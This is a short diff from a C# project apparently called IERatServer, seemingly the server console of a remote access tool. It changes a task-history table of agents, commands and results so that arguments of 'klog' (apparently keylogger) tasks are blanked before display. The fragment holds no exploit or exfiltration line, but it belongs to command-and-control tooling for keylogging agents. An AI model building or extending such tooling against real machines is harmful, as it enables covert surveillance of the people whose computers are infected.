@@ -61,6 +61,9 @@ namespace IERatServer.lib
             var table = new ConsoleTable("Agent #", "Command", "args", "Result", "Time");
             foreach (TaskHistoryObject taskHistoryObject in TaskHistory)
             {
+                if ((taskHistoryObject.task.Type.Contains("klog")) && (taskHistoryObject.task.args != "")) {
+                    taskHistoryObject.task.args = "";
+                }
                 if (taskHistoryObject.task.Result.Length > 50)
                 {
                     table.AddRow(taskHistoryObject.AgentNumber, taskHistoryObject.task.Type, taskHistoryObject.task.args,
